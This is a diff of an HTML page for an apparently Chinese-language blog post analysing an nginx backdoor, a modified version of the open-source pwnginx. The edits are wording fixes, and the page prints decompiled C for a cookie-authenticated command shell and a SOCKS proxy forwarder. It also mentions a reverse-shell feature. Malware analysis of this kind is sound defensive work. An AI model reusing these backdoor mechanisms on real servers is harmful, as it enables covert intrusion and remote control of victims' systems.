@@ -95,7 +95,7 @@
 
         
 <div class="section" id="content">
-    Fri Oct 19, 2018 &#183; 682 words
+    Fri Oct 19, 2018 &#183; 681 words
     
     <div class="tag-container">
         
@@ -131,7 +131,7 @@
 <li>3.Reverse Shell</li>
 </ul>
 
-<h1 id="1-execute-shell-command">1) Execute shell command</h1>
+<h1 id="1-shell-execute">1) Shell Execute</h1>
 
 <p>下面截取了一部分的代码，可以发现，通过匹配Cookie中的<code>worderx</code>字段来验证连接后门的密码，<code>typefp</code>字段作为功能的编号，1号是命令执行，最后调用<code>exec_shell(cmd_fd)</code>来返回一个简单的交互式Shell</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">if</span> ( request<span style="color:#f92672">-&gt;</span>headers_in.cookies.nelts <span style="color:#f92672">==</span> <span style="color:#ae81ff">1</span> )
@@ -197,7 +197,7 @@
         msend(cmd_fd, <span style="color:#e6db74">&#34;worderx2&#34;</span>, <span style="color:#ae81ff">9</span>);
         exec_socks5(cmd_fd);
       }</code></pre></div>
-<p>exec_socks5 设置代理函数中创建了一个子进程，随后进入worker函数中去执设置</p>
+<p>exec_socks5 设置代理函数中创建了一个子进程，随后进入worker函数中去设置代理的SOCKET链接</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">int</span> <span style="color:#66d9ef">__fastcall</span> __noreturn <span style="color:#a6e22e">exec_socks5</span>(<span style="color:#66d9ef">int</span> fd)
 {
   <span style="color:#66d9ef">if</span> ( fork() <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0</span> )
@@ -210,7 +210,7 @@
   worker(fd);
   exit(<span style="color:#ae81ff">0</span>);
 }</code></pre></div>
-<p>worker函数中根据接收到的域名和端口来创建一个新的udp会话，会后进入forwarder函数开始转发数据</p>
+<p>worker函数中根据接收到的域名和端口来创建一个新的udp会话,随后进入forwarder函数开始转发数据</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-C" data-lang="C">  puts(<span style="color:#e6db74">&#34;Recving request...&#34;</span>);
   v6 <span style="color:#f92672">=</span> (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span>)recv(csock, buffer, <span style="color:#ae81ff">0x2000uLL</span>, <span style="color:#ae81ff">0</span>); <span style="color:#75715e">// 接收数据
 </span><span style="color:#75715e"></span>  printf(<span style="color:#e6db74">&#34;Recved %d bytes</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, v6);
@@ -328,7 +328,7 @@ v22 <span style="color:#f92672">=</span> <span style="color:#ae81ff">30LL</span>
   }
   <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
 }</code></pre></div>
-<h1 id="3-traceing-replay">3) Traceing &amp; Replay</h1>
+<h1 id="3-tracing-replay">3) Tracing &amp; Replay</h1>
 
 <p>后来发现该后门是使用的github上开源项目<code>pwnginx</code>经过二次开发后的版本，并且修改了用于来连接和校验的cookie中使用的字段名称，以及增加了第三个后门功能，反弹shell到指定域名。</p>
 
